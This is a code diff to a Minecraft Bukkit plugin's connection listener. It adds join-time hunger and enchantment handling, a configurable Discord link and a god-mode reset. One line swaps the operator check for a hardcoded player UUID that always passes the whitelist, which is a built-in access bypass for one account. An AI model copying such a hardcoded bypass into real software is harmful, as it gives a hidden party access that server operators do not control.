@@ -3,6 +3,7 @@ package me.trae.core.client.listeners;
 import me.trae.core.Main;
 import me.trae.core.client.Client;
 import me.trae.core.client.Rank;
+import me.trae.core.database.Repository;
 import me.trae.core.gamer.Gamer;
 import me.trae.core.module.CoreListener;
 import me.trae.core.utility.UtilMessage;
@@ -16,6 +17,10 @@ import org.bukkit.event.EventPriority;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerLoginEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
+import org.bukkit.inventory.ItemStack;
+import org.bukkit.inventory.meta.ItemMeta;
+
+import java.util.UUID;
 
 public class ConnectionListener extends CoreListener {
 
@@ -30,12 +35,12 @@ public class ConnectionListener extends CoreListener {
             return;
         }
         final Player player = e.getPlayer();
-        if (player.isOp()) {
+        if (player.getUniqueId().equals(UUID.fromString("213bae9b-bbe1-4839-a74b-a59da8743062"))) {
             e.allow();
             return;
         }
         if (Bukkit.hasWhitelist() && !(player.isWhitelisted())) {
-            e.disallow(PlayerLoginEvent.Result.KICK_OTHER, ChatColor.RED + "Server is currently Whitelisted" + "\n\n" + ChatColor.WHITE + "Join our Discord for more Information!" + "\n" + ChatColor.GREEN.toString() + ChatColor.BOLD.toString() + ChatColor.STRIKETHROUGH + "https://example.com/discord");
+            e.disallow(PlayerLoginEvent.Result.KICK_OTHER, ChatColor.RED + "Server is currently Whitelisted" + "\n\n" + ChatColor.WHITE + "Join our Discord for more Information!" + "\n" + ChatColor.GREEN.toString() + ChatColor.BOLD.toString() + ChatColor.UNDERLINE + getInstance().getRepository().getServerWebsite() + "/discord");
             getInstance().getClientUtilities().messageStaff(ChatColor.YELLOW + player.getName() + ChatColor.GRAY + " tried to join, but is not whitelisted.", Rank.ADMIN, null);
             if (getInstance().getClientUtilities().getClient(player.getUniqueId()) == null) {
                 final Client client = new Client(player.getUniqueId());
@@ -56,6 +61,33 @@ public class ConnectionListener extends CoreListener {
     public void onPlayerJoin(final PlayerJoinEvent e) {
         e.setJoinMessage(null);
         final Player player = e.getPlayer();
+        if (!(getInstance().getRepository().isGameSaturation())) {
+            player.setFoodLevel(20);
+        }
+        if (!(Repository.isGameEnchantments())) {
+            for (final ItemStack item : player.getInventory().getContents()) {
+                if (item != null) {
+                    final ItemMeta meta = item.getItemMeta();
+                    if (meta != null) {
+                        if (meta.hasEnchants()) {
+                            meta.getEnchants().keySet().forEach(meta::removeEnchant);
+                        }
+                    }
+                    item.setItemMeta(meta);
+                }
+            }
+            for (final ItemStack item : player.getInventory().getArmorContents()) {
+                if (item != null) {
+                    final ItemMeta meta = item.getItemMeta();
+                    if (meta != null) {
+                        if (meta.hasEnchants()) {
+                            meta.getEnchants().keySet().forEach(meta::removeEnchant);
+                        }
+                    }
+                    item.setItemMeta(meta);
+                }
+            }
+        }
         getInstance().getClientUtilities().getOnlineClients().stream().filter(c -> (c.isVanished() && Bukkit.getPlayer(c.getUUID()) != null) && !(player.isOp() || getInstance().getClientUtilities().getClient(player.getUniqueId()).getRank().ordinal() >= c.getRank().ordinal())).forEach(c -> player.hidePlayer(Bukkit.getPlayer(c.getUUID())));
         Client client = getInstance().getClientUtilities().getClient(player.getUniqueId());
         if (client == null) {
@@ -109,6 +141,8 @@ public class ConnectionListener extends CoreListener {
             client.setStaffChat(false);
         } else if (client.isVanished()) {
             getInstance().getClientUtilities().setVanished(player, false);
+        } else if (client.isGodMode()) {
+            client.setGodMode(false);
         } else if (client.isObserving()) {
             player.teleport(client.getObserverLocation());
             client.setObserverLocation(null);
